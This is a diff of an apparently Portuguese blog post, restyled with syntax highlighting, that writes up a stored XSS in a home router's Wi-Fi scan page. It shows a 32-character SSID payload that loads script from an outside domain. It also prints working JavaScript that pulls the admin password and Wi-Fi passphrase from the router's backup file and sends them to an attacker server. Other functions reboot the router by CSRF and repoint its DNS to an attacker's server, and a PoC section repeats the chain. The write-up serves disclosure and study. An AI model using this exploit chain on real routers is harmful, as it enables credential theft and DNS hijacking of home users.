@@ -9,10 +9,14 @@
 			margin: 0 auto;
 			color: white;
 			background: black;
+			line-height: calc(1ex / 0.32);
 		}
 		pre {
 			font-family: 'gohu', monospace;
 			white-space: pre-wrap;
+			line-height: 125%;
+      background-color: #111;
+      padding: 1em;
 		}
 		@media only screen and (max-width:768px) {
 			body {
@@ -25,6 +29,48 @@
 		a:visited {
 			color: #004100 ;
 		}
+		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+		.codehilite .hll { background-color: #0000ff }
+		.codehilite { background: #000000; }
+		.codehilite .c { color: #00ff00 } /* Comment */
+		.codehilite .k { color: #ff0000 } /* Keyword */
+		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
+		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
+		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
+		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
+		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
+		.codehilite .cs { color: #00ff00 } /* Comment.Special */
+		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
+		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
+		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
+		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
+		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
+		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
+		.codehilite .s { color: #87ceeb } /* Literal.String */
+		.codehilite .no { color: #7fffd4 } /* Name.Constant */
+		.codehilite .nf { color: #ffff00 } /* Name.Function */
+		.codehilite .nv { color: #eedd82 } /* Name.Variable */
+		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
+		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
+		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
+		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
+		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
+		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
+		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
+		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
+		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
+		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
+		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
+		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
+		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
+		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
+		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
+		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
+		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
+		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
 	
 </style>
 <head>
@@ -46,94 +92,103 @@ Sim, isso é a senha dela</p>
 <p>Quando encontrei essa página, logo peguei o celular da minha namorada e subi um HotSpot com SSID <code>‘&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> e PAM ! Alert na cara. Bem legal e tal, mas um alert não é vulnerabilidade. Um grande problema com o SSID é que ele só aceita 32 carácteres, , então como fazer um XSS que realmente faça alguma coisa com só 32 chars ?</p>
 <h3>Tamanho importa</h3>
 <p>A forma mais fácil de diminuir o payload é carregando o JavaScript externamente utilizando o ‘src’, algo como :</p>
-<pre><code>            '&gt;&lt;script src="http://evil.com/"&gt;&lt;/script&gt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>            &#39;&gt;<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;http://evil.com/&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div>
+
+
 <p>Mas isso tem 42 carácteres :( Note uma das coisas que posso controlar é o nome do domínio. Então fui caçar o menor domínio que consegui encontrar para comprar. depois de DUAS HORA PROCURANDO eu consegui o domínio 6ks.me , um achado. Estamos agora em 40 carácteres, temos que remover 8. Outra idéia foi remover o “http://” , mas o browser vai tentar acessar 192.168.0.1/6ks.me . Me lembro de algum CTF que o que vem antes de “://” sempre especifica o protocolo a ser usado ( como em vnc:// magnet:// etc:// ) , e caso o protocolo não fosse especificado ele usaria o protocolo atual. Assim, consigo remover o “http:” , faltando retirar 3 chars. A barra no final também não é necessária, 2 chars. Para finalizar, a maioria dos browsers não se importa se você não colocar aspas no atributo.<br />
 E com <strong>32 chars cravados</strong> :</p>
-<pre><code>            '&gt;&lt;script src=//6ks.me&gt;&lt;/script&gt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>            &#39;&gt;<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">//6ks.me</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div>
+
+
 <p>Agora conseguimos injetar qualquer JavaScript que precisarmos. Mas o que podemos fazer? Podemos utilizar o <a href="https://developer.mozilla.org/pt-BR/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> para fazer qualquer requisição para o roteador. Fico fuçando o roteador e vendo as requisições que ele faz e vejo que depois de fazer alguma alteração importante ele faz um request para “rebootinfo.cgi” para reiniciar o modem.</p>
 <p>Uma coisa interessante é que no código de todas as páginas existe uma variável chamada “sessionKey” :</p>
-<pre><code>            var sessionKey = '540153280';
-</code></pre>
+<div class="codehilite"><pre><span></span><code>            <span class="k">var</span> <span class="n">sessionKey</span> <span class="o">=</span> <span class="s1">&#39;540153280&#39;</span><span class="p">;</span>
+</code></pre></div>
+
+
 <p>Essa key muda em toda requisição e é passada como parâmetro GET em todos os .cgi , se não for válida ele não realiza a ação. Alguma forma tosca de <a href="https://stackoverflow.com/questions/5207160/what-is-a-csrf-token-what-is-its-importance-and-how-does-it-work#33829607">CSRF Token</a>.</p>
 <p>Então antes de fazer a request para “rebootar” o modem, eu preciso fazer outro request para uma página qualquer para pegar a sessionKey. Abaixo o JS à ser injetado no browser :</p>
-<pre><code>function reboot_router() {
-    // XSS reiniciar modem
-    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    // Por quê? Porque é divertido ver um XSS fazer o LED apagar
+<div class="codehilite"><pre><span></span><code><span class="n">function</span> <span class="n">reboot_router</span><span class="p">()</span> <span class="p">{</span>
+    <span class="o">//</span> <span class="n">XSS</span> <span class="n">reiniciar</span> <span class="n">modem</span>
+    <span class="o">//</span> <span class="o">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+    <span class="o">//</span> <span class="n">Por</span> <span class="n">quê</span><span class="err">?</span> <span class="n">Porque</span> <span class="err">é</span> <span class="n">divertido</span> <span class="n">ver</span> <span class="n">um</span> <span class="n">XSS</span> <span class="n">fazer</span> <span class="n">o</span> <span class="n">LED</span> <span class="n">apagar</span>
 
-    xmlhttp=new XMLHttpRequest();
-    xmlhttp.open(&quot;GET&quot;, &quot;/resetrouter.html&quot;, false); // GET na interface
-    xmlhttp.send();
-    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Procurando pelo sessionKey
-    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/resetrouter.html&quot;</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span> <span class="o">//</span> <span class="n">GET</span> <span class="n">na</span> <span class="n">interface</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+    <span class="k">var</span> <span class="n">w</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Key&quot;</span><span class="p">)</span> <span class="p">;</span> <span class="o">//</span> <span class="n">Procurando</span> <span class="n">pelo</span> <span class="n">sessionKey</span>
+    <span class="k">var</span> <span class="n">sessionKey</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">w</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ; // Regex porque a key está dentro de aspas</span>
 
-    xmlhttp=new XMLHttpRequest();
-    xmlhttp.open(&quot;GET&quot;, &quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey, false); // Requisita a página de reboot com a sessionKey
-    xmlhttp.send();
-}
-</code></pre>
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/rebootinfo.cgi?sessionKey=&quot;</span><span class="o">+</span><span class="n">sessionKey</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span> <span class="o">//</span> <span class="n">Requisita</span> <span class="n">a</span> <span class="n">página</span> <span class="n">de</span> <span class="n">reboot</span> <span class="n">com</span> <span class="n">a</span> <span class="n">sessionKey</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+
 
 <p>Fuçando mais um pouco encontro a página backupsettings.cmd que nada mais é um XML com todas as configurações do modem, inclusive a senha do WiFi em Base64 e a senha do Administrador em PlainText. O mais legal é que não precisa da sessionKey.</p>
-<pre><code>function get_passwords(attackers_server) {
-    // attackers_server = servidor para enviar as credenciais
-    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    // Pegar a senha do WiFi e a senha do administrador
-    // através do backup das configurações
+<div class="codehilite"><pre><span></span><code><span class="n">function</span> <span class="n">get_passwords</span><span class="p">(</span><span class="n">attackers_server</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">//</span> <span class="n">attackers_server</span> <span class="o">=</span> <span class="n">servidor</span> <span class="n">para</span> <span class="n">enviar</span> <span class="k">as</span> <span class="n">credenciais</span>
+    <span class="o">//</span> <span class="o">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+    <span class="o">//</span> <span class="n">Pegar</span> <span class="n">a</span> <span class="n">senha</span> <span class="n">do</span> <span class="n">WiFi</span> <span class="n">e</span> <span class="n">a</span> <span class="n">senha</span> <span class="n">do</span> <span class="n">administrador</span>
+    <span class="o">//</span> <span class="n">através</span> <span class="n">do</span> <span class="n">backup</span> <span class="n">das</span> <span class="n">configurações</span>
 
-    xmlhttp=new XMLHttpRequest();
-    xmlhttp.open(&quot;GET&quot;, &quot;/backupsettings.cmd&quot;, false); // XML da configuração do roteador
-    xmlhttp.send();
-    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Procurando pela senha do Administrador
-    var y = xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;) ; // Procurando pela senha do WiFi
-    // Adicionando uma imagem na página atual para enviar as credenciais através de GET para o servidor do atacante
-    document.write('&lt;img src=&quot;'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'&quot;&gt;'); 
-}
-</code></pre>
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/backupsettings.cmd&quot;</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span> <span class="o">//</span> <span class="n">XML</span> <span class="n">da</span> <span class="n">configuração</span> <span class="n">do</span> <span class="n">roteador</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+    <span class="k">var</span> <span class="n">k</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Admin&quot;</span><span class="p">)</span> <span class="p">;</span> <span class="o">//</span> <span class="n">Procurando</span> <span class="n">pela</span> <span class="n">senha</span> <span class="n">do</span> <span class="n">Administrador</span>
+    <span class="k">var</span> <span class="n">y</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;KeyPassphrase&quot;</span><span class="p">)</span> <span class="p">;</span> <span class="o">//</span> <span class="n">Procurando</span> <span class="n">pela</span> <span class="n">senha</span> <span class="n">do</span> <span class="n">WiFi</span>
+    <span class="o">//</span> <span class="n">Adicionando</span> <span class="n">uma</span> <span class="n">imagem</span> <span class="n">na</span> <span class="n">página</span> <span class="n">atual</span> <span class="n">para</span> <span class="n">enviar</span> <span class="k">as</span> <span class="n">credenciais</span> <span class="n">através</span> <span class="n">de</span> <span class="n">GET</span> <span class="n">para</span> <span class="n">o</span> <span class="n">servidor</span> <span class="n">do</span> <span class="n">atacante</span>
+    <span class="n">document</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;&#39;</span><span class="o">+</span><span class="n">attackers_server</span><span class="o">+</span><span class="s1">&#39;?net=&#39;</span><span class="o">+</span> <span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">k</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span><span class="o">+</span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">y</span><span class="o">+</span><span class="mi">80</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">);</span> 
+<span class="p">}</span>
+</code></pre></div>
+
 
 <p>Por fim, mas não menos importante. Alterando o DNS do roteador nós conseguimos <a href="https://en.wikipedia.org/wiki/DNS_spoofing">DNS Poisoning</a>.</p>
-<pre><code>function dns_poisoning(attackers_dns) {
-    // attackers_dns = servidor DNS malicioso
-    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ caralho esse código ta muito feio, desculpa mundo
-    // Altera os servidores de DNS para o do atacante
+<div class="codehilite"><pre><span></span><code><span class="n">function</span> <span class="n">dns_poisoning</span><span class="p">(</span><span class="n">attackers_dns</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">//</span> <span class="n">attackers_dns</span> <span class="o">=</span> <span class="n">servidor</span> <span class="n">DNS</span> <span class="n">malicioso</span>
+    <span class="o">//</span> <span class="o">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span> <span class="n">caralho</span> <span class="n">esse</span> <span class="n">código</span> <span class="n">ta</span> <span class="n">muito</span> <span class="n">feio</span><span class="p">,</span> <span class="n">desculpa</span> <span class="n">mundo</span>
+    <span class="o">//</span> <span class="n">Altera</span> <span class="n">os</span> <span class="n">servidores</span> <span class="n">de</span> <span class="n">DNS</span> <span class="n">para</span> <span class="n">o</span> <span class="n">do</span> <span class="n">atacante</span>
 
-    xmlhttp=new XMLHttpRequest();   
-    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); 
-    xmlhttp.send();
-    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ;  // Procurando pelo sessionKey
-    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
-    var i_wanip = xmlhttp.responseText.indexOf(&quot;wanip&quot;) ;
-    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
-    var i_wansubnet = xmlhttp.responseText.indexOf(&quot;wansubnet&quot;) ; 
-    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
-    var i_wangatewayip = xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;) ; 
-    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>   
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/rede-dnsv4.html&quot;</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span> 
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+    <span class="k">var</span> <span class="n">w</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Key&quot;</span><span class="p">)</span> <span class="p">;</span>  <span class="o">//</span> <span class="n">Procurando</span> <span class="n">pelo</span> <span class="n">sessionKey</span>
+    <span class="k">var</span> <span class="n">sessionKey</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">w</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ; // Regex porque a key está dentro de aspas</span>
+    <span class="k">var</span> <span class="n">i_wanip</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;wanip&quot;</span><span class="p">)</span> <span class="p">;</span>
+    <span class="k">var</span> <span class="n">wanip</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">i_wanip</span><span class="p">,</span><span class="n">i_wanip</span><span class="o">+</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ;</span>
+    <span class="k">var</span> <span class="n">i_wansubnet</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;wansubnet&quot;</span><span class="p">)</span> <span class="p">;</span> 
+    <span class="k">var</span> <span class="n">wansubnet</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">i_wansubnet</span><span class="p">,</span><span class="n">i_wansubnet</span><span class="o">+</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ;</span>
+    <span class="k">var</span> <span class="n">i_wangatewayip</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;wangatewayip&quot;</span><span class="p">)</span> <span class="p">;</span> 
+    <span class="k">var</span> <span class="n">wangatewayip</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">i_wangatewayip</span><span class="p">,</span><span class="n">i_wangatewayip</span><span class="o">+</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ;</span>
 
-    xmlhttp=new XMLHttpRequest();
-    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;+wanip+&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;+wansubnet+&quot;&amp;wanIntfGateway=&quot;+wangatewayip+&quot;&amp;dnsPrimary=&quot;+attackers_dns+&quot;&amp;dnsSecondary=&quot;+attackers_dns+&quot;&amp;sessionKey=&quot;+sessionKey, false);
-    xmlhttp.send(); // Fazendo a requisiço para SALVAR as novas configurações do DNS
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;</span><span class="o">+</span><span class="n">wanip</span><span class="o">+</span><span class="s2">&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;</span><span class="o">+</span><span class="n">wansubnet</span><span class="o">+</span><span class="s2">&quot;&amp;wanIntfGateway=&quot;</span><span class="o">+</span><span class="n">wangatewayip</span><span class="o">+</span><span class="s2">&quot;&amp;dnsPrimary=&quot;</span><span class="o">+</span><span class="n">attackers_dns</span><span class="o">+</span><span class="s2">&quot;&amp;dnsSecondary=&quot;</span><span class="o">+</span><span class="n">attackers_dns</span><span class="o">+</span><span class="s2">&quot;&amp;sessionKey=&quot;</span><span class="o">+</span><span class="n">sessionKey</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span> <span class="o">//</span> <span class="n">Fazendo</span> <span class="n">a</span> <span class="n">requisiço</span> <span class="n">para</span> <span class="n">SALVAR</span> <span class="k">as</span> <span class="n">novas</span> <span class="n">configurações</span> <span class="n">do</span> <span class="n">DNS</span>
 
-    // Depois de salvar, precisamos aplicar as configurações, fuck logic
+    <span class="o">//</span> <span class="n">Depois</span> <span class="n">de</span> <span class="n">salvar</span><span class="p">,</span> <span class="n">precisamos</span> <span class="n">aplicar</span> <span class="k">as</span> <span class="n">configurações</span><span class="p">,</span> <span class="n">fuck</span> <span class="n">logic</span>
 
-    //Getting a brand NEW SessionKey
-    xmlhttp=new XMLHttpRequest();   
-    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
-    xmlhttp.send();
-    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ;  // Procurando pelo sessionKey
-    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
+    <span class="o">//</span><span class="n">Getting</span> <span class="n">a</span> <span class="n">brand</span> <span class="n">NEW</span> <span class="n">SessionKey</span>
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>   
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/rede-dnsv4.html&quot;</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span> <span class="o">//</span> <span class="n">GET</span> <span class="n">the</span> <span class="n">DNS</span> <span class="n">Config</span> <span class="n">page</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+    <span class="k">var</span> <span class="n">w</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Key&quot;</span><span class="p">)</span> <span class="p">;</span>  <span class="o">//</span> <span class="n">Procurando</span> <span class="n">pelo</span> <span class="n">sessionKey</span>
+    <span class="k">var</span> <span class="n">sessionKey</span> <span class="o">=</span> <span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">w</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ; // Regex porque a key está dentro de aspas</span>
 
-    xmlhttp=new XMLHttpRequest();   
-    xmlhttp.open(&quot;GET&quot;, &quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey, false); // Aplicando as confs
-    xmlhttp.send();
-}
-</code></pre>
+    <span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>   
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/wandnscfg.cmd?sessionKey=&quot;</span><span class="o">+</span><span class="n">sessionKey</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span> <span class="o">//</span> <span class="n">Aplicando</span> <span class="k">as</span> <span class="n">confs</span>
+    <span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+
 
 <h3>PoC</h3>
-<pre><code>// Vulnerable URL : https://your.rou.ter.ip/wlscanresults.html
-// XSS through SSID : '&gt;&lt;script src=//6ks.me&gt;&lt;/script&gt;   ( Exactly 32 bytes u_u )
+<div class="codehilite"><pre><span></span><code>// Vulnerable URL : https://your.rou.ter.ip/wlscanresults.html
+// XSS through SSID : &#39;&gt;<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">//6ks.me</span><span class="nt">&gt;&lt;/script&gt;</span>   ( Exactly 32 bytes u_u )
 //                             ^
-//  5char domains are running  |    'src' does not requires quotes , and passing the URL with ony '//' 
+//  5char domains are running  |    &#39;src&#39; does not requires quotes , and passing the URL with ony &#39;//&#39; 
 //  out, grab yours !          +---&gt; it will cause the browser to make the request with the current protocol,
 //                                   which is HTTP , duh
 // Below is the content of 6ks.me
@@ -142,28 +197,28 @@ E com <strong>32 chars cravados</strong> :</p>
 function get_passwords(attackers_server) {
     // attackers_server = server to send the credentials
     // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    // XSS to get Admin's login/passwd + Wifi passphrase
+    // XSS to get Admin&#39;s login/passwd + Wifi passphrase
     // from backup settings 
 
     xmlhttp=new XMLHttpRequest();
     xmlhttp.open(&quot;GET&quot;, &quot;/backupsettings.cmd&quot;, false); // GET the Backup XML
     xmlhttp.send();
-    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Search for Admin's Login and Password
+    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Search for Admin&#39;s Login and Password
     var y = xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;) ; // Search for Wifi PassPhrase
     // Add a img requesting the attacker website with the leaked passwords in the GET parameters
-    document.write('&lt;img src=&quot;'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'&quot;&gt;'); 
+    document.write(&#39;<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;&#39;+attackers_server+&#39;?net=&#39;+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+&#39;&quot;</span><span class="nt">&gt;</span>&#39;); 
 }
 
 function reboot_router() {
     // XSS + CSRF reboot router
     // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    // Why? Because It's fun to watch a XSS doing 'physical' stuff
+    // Why? Because It&#39;s fun to watch a XSS doing &#39;physical&#39; stuff
 
     xmlhttp=new XMLHttpRequest();
     xmlhttp.open(&quot;GET&quot;, &quot;/resetrouter.html&quot;, false); // GET the page of the reset interface
     xmlhttp.send();
     var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
-    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/&#39;([^&#39;]+)&#39;/)[1] ; // Regex because the key is inside quotes
 
     xmlhttp=new XMLHttpRequest();
     xmlhttp.open(&quot;GET&quot;, &quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey, false); // Request the reboot page with the CSRF token
@@ -174,32 +229,32 @@ function dns_poisoning(attackers_dns) {
